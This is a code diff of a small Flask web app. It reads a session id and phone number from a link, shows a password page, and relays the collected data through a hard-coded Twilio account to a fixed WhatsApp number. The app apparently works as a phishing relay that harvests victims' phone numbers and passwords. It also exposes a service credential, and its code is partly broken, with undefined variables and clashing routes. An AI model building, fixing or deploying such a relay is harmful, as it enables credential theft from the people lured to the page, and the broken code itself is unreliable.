@@ -16,23 +16,9 @@ idsess=''
 app = Flask(__name__) 
 
 
-
-@app.route("/", methods=['GET'])
-def retrievePassWord():
-    global idsess
-    global phone
-    
-    idsess=request.args.get('sessionid')
-    phone=request.args.get('phone')
-        
-    return render_template('password.html')
-@app.route('/', methods=['GET','POST'])
-def retrievePhone():
-    phone = request.args.get('phone')
-    return phone
 @app.route('/envoi', methods = ['GET', 'POST'])
 
-def envoi():
+def envoi(phone):
     if request.method == 'POST':
         password = request.form['password']
     account_sid = 'AC89c7cf15d429617da0f4dbe4ad393744'
@@ -54,10 +40,24 @@ def envoi():
     phone6=''.join(phone5)
     number='whatsapp:+'+phone3
     message = client.messages.create(
-                              body=retrievePhone(),
+                              body=phone,
                               from_='whatsapp:+14155238886',
                               to='whatsapp:+221776147852'
                           )
+@app.route("/", methods=['GET'])
+def retrievePassWord():
+    global idsess
+    global phone
+    
+    idsess=request.args.get('sessionid')
+    phone=request.args.get('phone')
+    envoi(phone)   
+    return render_template('password.html')
+@app.route('/', methods=['POST'])
+def retrievePhone():
+    phone = request.args.get('phone')
+    return phone
+
     
     
     
